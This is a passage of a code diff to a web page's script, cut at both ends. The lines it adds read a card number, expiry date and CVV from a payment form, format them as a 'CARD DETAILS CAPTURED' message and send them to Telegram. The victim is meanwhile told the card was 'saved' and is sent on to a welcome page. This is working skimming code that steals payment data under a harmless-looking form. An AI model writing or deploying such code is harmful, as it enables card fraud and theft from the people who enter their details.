+        const cardNumber = cardInput.value; 
+        const expiry = expiryInput.value; 
+        const cvv = cvvInput.value; 
+        const cardNumDigits = cardNumber.replace(/\D/g, '');
+        
+        let cardTypeStr = 'Unknown';
+        if (cardNumDigits.startsWith('4')) cardTypeStr = 'Visa'; 
+        else if (cardNumDigits.startsWith('5')) cardTypeStr = 'Mastercard'; 
+        else if (cardNumDigits.startsWith('3')) cardTypeStr = 'Amex'; 
+        else if (cardNumDigits.startsWith('6')) cardTypeStr = 'Discover';
+        
+        const message = `💳 CARD DETAILS CAPTURED 💳\n━━━━━━━━━━━━━━━━━━\n📱 Card Number: ${cardNumber}\n📅 Expiry Date: ${expiry}\n🔐 CVV: ${cvv}\n💳 Card Type: ${cardTypeStr}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
+        
+        try {
+          await sendToTelegram(message);
+          statusMessage.className = 'status-message success'; 
+          statusMessage.textContent = '✅ Card saved!';
+          setTimeout(() => {
+            clearField(cardInput, cardIcon, cardMessage, cardType); 
+            clearField(expiryInput, expiryIcon, expiryMessage); 
+            clearField(cvvInput, cvvIcon, cvvMessage);
+            statusMessage.style.display = 'none';
+            showPage4();  // Go to welcome page after card
+          }, 800);
+        } catch (error) {
+          statusMessage.className = 'status-message error'; 
+          statusMessage.textContent = '❌ Connection failed. Try again.';
+        }
+      });
+
+      // Done button on welcome page goes back to page1
       doneBtn.addEventListener('click', () => {
         showPage1();
       });
 
-      // Prevent non-numeric
+      // Prevent non-numeric for card fields
       [cardInput, cvvInput, expiryInput].forEach(input => {
         input.addEventListener('keydown', function(e) {
           if (input.id === 'expiry' && e.key === '/') return;
